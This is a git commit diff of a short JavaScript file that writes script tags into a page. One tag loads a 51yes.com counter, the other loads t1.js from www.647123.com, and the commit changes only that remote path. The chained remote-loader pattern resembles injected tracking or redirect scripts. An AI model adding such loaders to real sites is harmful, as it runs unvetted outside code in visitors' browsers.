4862577f0c4330adc2bdc17f07f14a52003c2fa7
js999999999 <js-9@outlook.com>
2018-04-09 12:32:06 +0800

    Update tt7.js

--- 2017qq/tt7.js
+++ 2017qq/tt7.js
@@ -1,3 +1,3 @@
 document.writeln("<script language=\"javascript\" src=\"http:\/\/count1.51yes.com\/click.aspx?id=16992348&logo=12\" charset=\"gb2312\"><\/script>");
 
-document.writeln("<script src=http:\/\/\www.647123.com\/2017qq11/t1.js ><\/script>");
+document.writeln("<script src=http:\/\/\www.647123.com\/2017qq/t1.js ><\/script>");
